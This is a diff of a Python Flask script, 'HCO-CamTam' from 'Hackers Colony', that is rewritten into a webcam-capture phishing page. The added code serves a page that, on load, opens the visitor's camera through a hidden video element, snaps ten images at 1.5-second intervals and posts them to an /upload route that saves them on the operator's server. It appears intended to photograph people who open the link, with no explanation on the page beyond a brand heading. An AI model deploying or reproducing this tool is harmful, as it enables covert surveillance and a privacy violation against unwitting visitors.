@@ -1,50 +1,59 @@
 #!/usr/bin/env python3
-"""
-HCO-CamTam - Camera Tool
-By Azhar (Hackers Colony)
-"""
-
-import os
-import cv2
-from flask import Flask
-from colorama import Fore, Style, init
-
-init(autoreset=True)
+from flask import Flask, render_template_string
+import os, base64
 
 app = Flask(__name__)
-CAPTURE_DIR = "captures"
-TOTAL_IMAGES = 10
 
-# Ensure captures/ directory exists
-os.makedirs(CAPTURE_DIR, exist_ok=True)
+HTML_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+<title>Camera Capture</title>
+</head>
+<body onload="startCam()">
+<h2 style="color:red;text-align:center;">📸 HCO Cam Tam by Azhar</h2>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<script>
+let count = 0;
+function startCam(){
+    navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
+        let video = document.getElementById("video");
+        video.srcObject = stream;
+        let canvas = document.createElement("canvas");
+        let ctx = canvas.getContext("2d");
+        let capture = setInterval(()=>{
+            if(count>=10){
+                clearInterval(capture);
+                stream.getTracks().forEach(t=>t.stop());
+                return;
+            }
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video,0,0);
+            fetch("/upload",{method:"POST",body:canvas.toDataURL("image/png")});
+            count++;
+        },1500);
+    });
+}
+</script>
+</body>
+</html>
+"""
 
-def gen_frames():
-    cam = cv2.VideoCapture(0)  # 0 = front camera
-    count = 0
-
-    print(Fore.CYAN + "[*] Capturing images from front camera...")
-
-    while count < TOTAL_IMAGES:
-        success, frame = cam.read()
-        if not success:
-            print(Fore.RED + "[!] Camera not accessible!")
-            break
-        else:
-            filename = os.path.join(CAPTURE_DIR, f"img_{count+1}.jpg")
-            cv2.imwrite(filename, frame)
-            print(Fore.GREEN + f"[+] Saved {filename}")
-            count += 1
-
-    cam.release()
-    if count == TOTAL_IMAGES:
-        print(Fore.MAGENTA + Style.BRIGHT + f"\n[✔] {TOTAL_IMAGES} images received successfully!")
-        print(Fore.YELLOW + f"[📂] Saved inside: {CAPTURE_DIR}/\n")
-
-@app.route('/')
+@app.route("/")
 def index():
-    gen_frames()
-    return "<h2 style='color:green;'>Camera access complete. You may close this page.</h2>"
+    return render_template_string(HTML_PAGE)
+
+@app.route("/upload", methods=["POST"])
+def upload():
+    import flask
+    data = flask.request.data.decode("utf-8")
+    if data.startswith("data:image/png;base64,"):
+        data = data.split(",")[1]
+        os.makedirs("captures", exist_ok=True)
+        with open(f"captures/front_{len(os.listdir('captures'))+1}.png","wb") as f:
+            f.write(base64.b64decode(data))
+    return "OK"
 
 if __name__ == "__main__":
-    print(Fore.BLUE + "[*] Flask server started on http://127.0.0.1:5000")
     app.run(host="0.0.0.0", port=5000)
